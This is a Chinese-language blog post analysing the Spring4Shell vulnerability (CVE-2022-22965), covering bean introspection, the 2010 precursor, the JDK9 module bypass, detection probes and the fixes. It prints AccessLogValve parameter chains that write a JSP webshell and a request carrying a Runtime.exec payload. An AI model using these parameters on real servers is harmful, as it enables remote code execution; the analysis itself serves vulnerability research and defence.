---
title: CVE-2022-22965 SpringFramework 漏洞分析
key: CVE-2022-22965
tags: VUL-Reproduce
---

<!--more-->

## 前言

这个洞爆发的第二天，在拿到exp并复现成功后，其实心里是想着趁热度发一下文章的，但完完整整跟进完这个漏洞后，我发现我也只是停留在 _复现_ 的层面上，这也让我思考一个问题，**写一篇漏洞分析的文章，需要具备怎样的素养？** 

![image-20220407174417845](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220408134504.png)

虽然作为初学者，所谓漏洞分析大多都是站在前人的肩膀上，不过还是希望可以写出一些自己的东西，踩的坑也好一些无关痛痒的理解也罢。希望读完这篇文章，你可以基本上解答以下几个问题：

1. 为什么版本需要JDK9及以上，而JDK8不行？
2. 为什么是需要Spring tomcat war部署方式，Springboot jar会受影响吗？
3. 漏洞的影响面和利用方式是什么，新的PATCH又是如何修复的？

带着这三个问题，让我们走进spring4shell。

## JavaBean与SpringBean

什么是JavaBean呢？

JavaBean在语法上和类没有区别，其内部没有特定的功能方法，主要包含信息字段和存储方法，如果一个类遵从了以下JavaBean的标准，那么它就是一个JavaBean：

1. 所有属性为`private`。
2. 类声明为`public`，提供默认的无参构造方法。
3. 提供`setter&getter`方法，让外部可以`设置&获取`JavaBean的属性。

同时，JavaBean对其方法和属性的命名有一定要求，去掉`setter&getter`方法的前缀，剩下部分就是属性名(小写)。

在idea中就支持自动根据属性填充`setter&getter`，实现一个简单的JavaBean。

![image-20220420115200100](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220420125751.png)

 如果你之前对SpringMVC没有任何了解的话，建议手动搭建一下相关[环境](https://theoyu.top/2022/04/06/springMVC01.html#%E9%80%9A%E8%BF%87%E5%AE%9E%E4%BD%93-bean-%E6%8E%A5%E6%94%B6%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0)，在这个控制器里我们就通过JavaBean接收请求参数：

```java
@RequestMapping(value = "/login5")
public String login5(User user, Model model){
    model.addAttribute("name",user.getUsername());
    return "login";
}
```

发送以下请求：

![image-20220420104726972](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175428.png)

可以看到SpringMVC自动把GET传入的参数注入到了bean对象中。

对命名规则有如此要求的好处在于，当一个类被当作JavaBean使用时，即使其内部私有属性无法被访问，也可以通过方法名推断出来，那么 **就可以通过反射自动注入到其属性中** 。

Java 核心库提供的`Introspector`就可以获取一个JavaBean的所有属性以及对应属性的读写方法，也称为内省。

```java
public class Test  {
    public static void main(String[] args) throws Exception {
        BeanInfo info = Introspector.getBeanInfo(User.class);
        for (PropertyDescriptor pd : info.getPropertyDescriptors()) {
            System.out.println("[Property]"+pd.getName());
            System.out.println("  [ReadMethod]" + pd.getReadMethod());
            System.out.println("  [WriteMethod]" + pd.getWriteMethod());
        }
    }

    public class User {
        private String username;
        private String password;

        public String getUsername() {
            return username;
        }

        public void setUsername(String username) {
            this.username = username;
        }

        public String getPassword() {
            return password;
        }

        public void setPassword(String password) {
            this.password = password;
        }
    }
}
```

![image-20220420130721427](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175434.png)

在输出的结果中，后两者是我们预想范围内的，但是这个class属性是怎么来的呢？

原因在于在Java中，所有类都会继承于`Object`类，而在`Object`中又存在`getClass()`方法，由于内省机制就会认为存在一个class属性。

![image-20220420131236499](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175437.png)

可以拿到class属性，不过好在class属性并没有`WriteMethod`，即没有set方法去设置其值，所以这也不算是一个严峻的问题。

走到这，我们有必要走进SpringMVC数据绑定的步骤，在上述的参数绑定过程，主要发生在下图的第五步中。

![image-20220410141300306](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220412155730.png)

我们不一一展开调用链，挑几个关键类、方法分析：

- `org.springframework.beans.AbstractNestablePropertyAccessor`

JavaBean的核心处理抽象类，包含set、get等处理逻辑实现以及 **嵌套属性** 的处理。

![image-20220421160055832](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175441.png)

从这个方法所引申的几个方法主要是解决了递归调用的问题，比如如果我在java中想调用`user.getInfo().getAge()`，那么传入的参数就为`user.info.age`，在解析流程中会对`.`进行了分割识别，并递归返回调用对象。

- `org.springframework.beans.CachedIntrospectionResults`：

缓存了JavaBean的信息，之后需要使用可以直接从这获取。内部使用了`Introspector.getBeanInfo(beanClass)`进行了存储，这我们可不陌生，也正是因为缓存的存在，在上述例子中即使 **info**，**age**都是私有属性，我们也可以通过内省机制访问到。

- `org.springframework.beans.BeanWrapperImpl`：

`BeanWrapper`接口的实现类和抽象类`AbstractNestablePropertyAccessor`的子类，其对JavaBean进行了封装，其`setValue`方法通过反射完成了最终的属性注入。

![image-20220421161153787](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175444.png)

总结以上三点，目前我们得知的内容为：

1. `CachedIntrospectionResults`缓存中使用`Introspector.getBeanInfo(beanClass)`进行了存储，使得我们可以通过内省机制访问私有属性，并且由于类继承我们可以拿到class属性。
2. `AbstractNestablePropertyAccessor`中可递归处理请求，和内省机制结合可越过前面不存在set方法的属性。
3. `BeanWrapperImpl.setValue()`可通过反射对一个存在set方法的属性设置其值。

其实现在，我们的意图已经很明显了，从class属性一路延伸，找到一个可以利用的属性。

## CVE-2010-1622是如何做的？

在`CachedIntrospectionResults`的构造方法中，有一个很明显的黑名单：

![image-20220421163405170](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175450.png)

相当于如果调用`class.classLoader`则会被直接拦截。

这也拉开了CVE-2022-22965的前身的序幕：CVE-2010-1622 SpringMVC框架任意代码执行漏洞。

我们把目光放在12年前，classLoader还没有放入黑名单，我们是如何利用的：

`class.classLoader.resources.context.parent.pipeline.first`

其中：

- `context`对应`StandardContext`
- `parent`对应`StandardHost`
- `pipeline`对应`StandardPipeline`
- `first`对应`AccessLogValve`

在`org.apache.catalina.valves.AccessLogValve`中，我们可以找到许多存在set方法的属性：

```java
public class Test  {
    public static void main(String[] args) throws Exception {
        BeanInfo info = Introspector.getBeanInfo(AccessLogValve.class);
        for (PropertyDescriptor pd : info.getPropertyDescriptors()) {
            System.out.println("[Property]"+pd.getName());
            System.out.println("  [ReadMethod]" + pd.getReadMethod());
            System.out.println("  [WriteMethod]" + pd.getWriteMethod());
        }
    }
//输出：
[Property]asyncSupported
  [ReadMethod]public boolean org.apache.catalina.valves.ValveBase.isAsyncSupported()
  [WriteMethod]public void org.apache.catalina.valves.ValveBase.setAsyncSupported(boolean)
[Property]buffered
  [ReadMethod]public boolean org.apache.catalina.valves.AccessLogValve.isBuffered()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setBuffered(boolean)
[Property]checkExists
  [ReadMethod]public boolean org.apache.catalina.valves.AccessLogValve.isCheckExists()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setCheckExists(boolean)
[Property]class
  [ReadMethod]public final native java.lang.Class java.lang.Object.getClass()
  [WriteMethod]null
[Property]condition
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AbstractAccessLogValve.getCondition()
  [WriteMethod]public void org.apache.catalina.valves.AbstractAccessLogValve.setCondition(java.lang.String)
[Property]conditionIf
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AbstractAccessLogValve.getConditionIf()
  [WriteMethod]public void org.apache.catalina.valves.AbstractAccessLogValve.setConditionIf(java.lang.String)
[Property]conditionUnless
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AbstractAccessLogValve.getConditionUnless()
  [WriteMethod]public void org.apache.catalina.valves.AbstractAccessLogValve.setConditionUnless(java.lang.String)
[Property]container
  [ReadMethod]public org.apache.catalina.Container org.apache.catalina.valves.ValveBase.getContainer()
  [WriteMethod]public void org.apache.catalina.valves.ValveBase.setContainer(org.apache.catalina.Container)
[Property]directory
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AccessLogValve.getDirectory()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setDirectory(java.lang.String)
[Property]domain
  [ReadMethod]public final java.lang.String org.apache.catalina.util.LifecycleMBeanBase.getDomain()
  [WriteMethod]public final void org.apache.catalina.util.LifecycleMBeanBase.setDomain(java.lang.String)
[Property]domainInternal
  [ReadMethod]public java.lang.String org.apache.catalina.valves.ValveBase.getDomainInternal()
  [WriteMethod]null
[Property]enabled
  [ReadMethod]public boolean org.apache.catalina.valves.AbstractAccessLogValve.getEnabled()
  [WriteMethod]public void org.apache.catalina.valves.AbstractAccessLogValve.setEnabled(boolean)
[Property]encoding
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AccessLogValve.getEncoding()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setEncoding(java.lang.String)
[Property]fileDateFormat
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AccessLogValve.getFileDateFormat()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setFileDateFormat(java.lang.String)
[Property]ipv6Canonical
  [ReadMethod]public boolean org.apache.catalina.valves.AbstractAccessLogValve.getIpv6Canonical()
  [WriteMethod]public void org.apache.catalina.valves.AbstractAccessLogValve.setIpv6Canonical(boolean)
[Property]locale
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AbstractAccessLogValve.getLocale()
  [WriteMethod]public void org.apache.catalina.valves.AbstractAccessLogValve.setLocale(java.lang.String)
[Property]maxDays
  [ReadMethod]public int org.apache.catalina.valves.AccessLogValve.getMaxDays()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setMaxDays(int)
[Property]maxLogMessageBufferSize
  [ReadMethod]public int org.apache.catalina.valves.AbstractAccessLogValve.getMaxLogMessageBufferSize()
  [WriteMethod]public void org.apache.catalina.valves.AbstractAccessLogValve.setMaxLogMessageBufferSize(int)
[Property]next
  [ReadMethod]public org.apache.catalina.Valve org.apache.catalina.valves.ValveBase.getNext()
  [WriteMethod]public void org.apache.catalina.valves.ValveBase.setNext(org.apache.catalina.Valve)
[Property]objectName
  [ReadMethod]public final javax.management.ObjectName org.apache.catalina.util.LifecycleMBeanBase.getObjectName()
  [WriteMethod]null
[Property]objectNameKeyProperties
  [ReadMethod]public java.lang.String org.apache.catalina.valves.ValveBase.getObjectNameKeyProperties()
  [WriteMethod]null
[Property]pattern
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AbstractAccessLogValve.getPattern()
  [WriteMethod]public void org.apache.catalina.valves.AbstractAccessLogValve.setPattern(java.lang.String)
[Property]prefix
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AccessLogValve.getPrefix()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setPrefix(java.lang.String)
[Property]renameOnRotate
  [ReadMethod]public boolean org.apache.catalina.valves.AccessLogValve.isRenameOnRotate()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setRenameOnRotate(boolean)
[Property]requestAttributesEnabled
  [ReadMethod]public boolean org.apache.catalina.valves.AbstractAccessLogValve.getRequestAttributesEnabled()
  [WriteMethod]public void org.apache.catalina.valves.AbstractAccessLogValve.setRequestAttributesEnabled(boolean)
[Property]rotatable
  [ReadMethod]public boolean org.apache.catalina.valves.AccessLogValve.isRotatable()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setRotatable(boolean)
[Property]state
  [ReadMethod]public org.apache.catalina.LifecycleState org.apache.catalina.util.LifecycleBase.getState()
  [WriteMethod]null
[Property]stateName
  [ReadMethod]public java.lang.String org.apache.catalina.util.LifecycleBase.getStateName()
  [WriteMethod]null
[Property]suffix
  [ReadMethod]public java.lang.String org.apache.catalina.valves.AccessLogValve.getSuffix()
  [WriteMethod]public void org.apache.catalina.valves.AccessLogValve.setSuffix(java.lang.String)
[Property]throwOnFailure
  [ReadMethod]public boolean org.apache.catalina.util.LifecycleBase.getThrowOnFailure()
  [WriteMethod]public void org.apache.catalina.util.LifecycleBase.setThrowOnFailure(boolean)
```

从类名得知我们可以通过修改访问成功的日志文件，来写入jsp。

默认的配置为：

```txt
class.classLoader.resources.context.parent.pipeline.first.directory =logs
class.classLoader.resources.context.parent.pipeline.first.prefix =localhost_access_log
class.classLoader.resources.context.parent.pipeline.first.suffix = .txt
class.classLoader.resources.context.parent.pipeline.first.fileDateFormat =.yyyy-mm-dd
```

我们可以修改为：

```txt
class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT

class.classLoader.resources.context.parent.pipeline.first.prefix=shell

class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
```

这有点像phpmyadmin通过日志文件写马的思路，不过日志文件rce都大同小异。

这样随意访问`/?a=<%Runtime.getRuntime().exec("open -a Calculator");%>`即可写入恶意语句。

## 为何需要JDK9？

至此，其实答案也算比较明了了，CVE-2010-1622后Spring采用了黑名单限制了`class.classLoader`，而JDK9引入了[ Module](https://blog.csdn.net/charles_neil/article/details/114460702) 机制，可以通过`class.module.classLoader`绕过黑名单。

## Array.set 的一个误区

在不少的文章中，都有谈到如果需要set的属性是array类型，会有意想不到的效果。

我们模拟一下以下场景，给`User`类多加了一个age属性，但是并没有设置其set方法。

```java
@RequestMapping(value = "/login5")
public String login5(User user, Model model){
    model.addAttribute("name",user.getUsername());
    System.out.println(user.getAge());
    return "login";
}
...
public class User {
    private String username;
    private String password;
    private int age;

    public int getAge() {
        return age;
    }
  ...
}
```

发送请求`http://localhost:8080/login5?username=theoyu&age=10`，终端不出意外的打印了0。

我们改写一下属性，增添一个数组类型ages，同样不设置set方法：

```java
@RequestMapping(value = "/login5")
public String login5(User user, Model model){
    model.addAttribute("name",user.getUsername());
    System.out.println(user.getAges()[0]);
    return "login";
}
...
public class User {
    private String username;
    private String password;
    private int[] ages = {0};

    public int[] getAges() {
        return ages;
    }
  ...
}
```

发送请求`http://localhost:8080/login5?username=theoyu&ages[0]=10`，

我们会发现终端居然输出了10！这和我们之前所想的不一样，没有set方法居然也可以绑定私有属性的值。

具体位置在：`AbstractNestablePropertyAccessor.processKeyedProperty`

实际上除了Array类型，Map、Set类型也同样可以直接赋值：

![image-20220421182917229](../../../../Library/Application Support/typora-user-images/image-20220421182917229.png)

 我认为这应该只是对特定类型的一种补充，但有不少文章都把这个特性纳入到了最后的属性注入上去，这是我不太能理解的点，因为目前来看我们利用的属性还没有需要用到这个特性的。

## 单应用启动会受影响吗？

下图为tomcat war包启动，获取到的classLoader：WebappClassLoader

![image-20220421110653486](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175457.png)

下图为单应用（springboot jar）启动，获取到的classLoader：JDK自带的AppClassLoader

![image-20220421110809107](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175459.png)

两者的差别在于获取到classLoader的后利用上，WebappClassLoader采用了类隔离机制(之前RASP这块踩了好多坑)，拥有更多的属性，所以只是在拓展面上有所差异，不过我们目前所已知的利用方法都是在WebappClassLoader上。

## 无害探测

如果我们想写一个poc，批量验证漏洞，该怎么做呢？

当然可以直接用现有exp的方式，日志写马。

但是作为 **Proof Of Concept**，我们还是希望把侵入性化为最小，这样来看修改日志文件肯定不合适，而且这样甚至有可能会把业务打崩，我们需要从其他属性入手。

1. `class.module.classLoader.DefaultAssertionStatus`:

该属性的set方法传参为bool类型，如果传入0、1正常，其他字符返回400，可作为判断依据。

```
class.module.classLoader.DefaultAssertionStatus=0
class.module.classLoader.DefaultAssertionStatus=x
```

这样我们可以通过发两次包，从两次的返回状态码进行判断。

![image-20220421225051339](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421231217.png)

2. `class.module.classLoader.resources.context.configFile`

![image-20220421225545352](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421231222.png)

位于`org.apache.catalina.core.StandardContext`的`configFile`属性为URL类型， 默认为file协议，访问缓存在本地的xml文件，可修改为http协议达到反连检测的目的。

```
http://localhost:8080/login5?username=theoyu&class.module.classLoader.resources.context.configFile=http://127.0.0.1:20022&class.module.classLoader.resources.context.configFile.content.config=config.conf
```

![image-20220421231211477](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421231225.png)

以上两种方法均已添加至 [Gopo](https://github.com/yuuuuu422/Gopo)的YAML规则。

## 漏洞修复

和 CVE-2010-1622 漏洞一样，Spring官方和Tomcat都对这个漏洞进行了修复。

Spring官方做了两点限制，一是把黑名单改为了白名单：要求`pd.getName`必须是以『Name』结尾，而是返回的类型不能为`classLoader`类型。

![image-20220421191637423](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421234356.png)

Tomcat则直接把获取resources的方法给改成了`return null`。

![image-20220421190048440](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421234400.png)

如果还想进一步绕过的话，可以通过 ... 如果我知道的话 ...

## 参考

- [廖雪峰的官方网站 JavaBean](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680)
- [Struts2 S2-020在Tomcat 8下的命令执行分析](https://cloud.tencent.com/developer/article/1035297)
- [Spring Beans RCE分析](https://xz.aliyun.com/t/11129#toc-0)

- [SpringMVC框架任意代码执行漏洞(CVE-2010-1622)分析](http://rui0.cn/archives/1158)

- [JDK9 - Module](https://blog.csdn.net/charles_neil/article/details/114460702)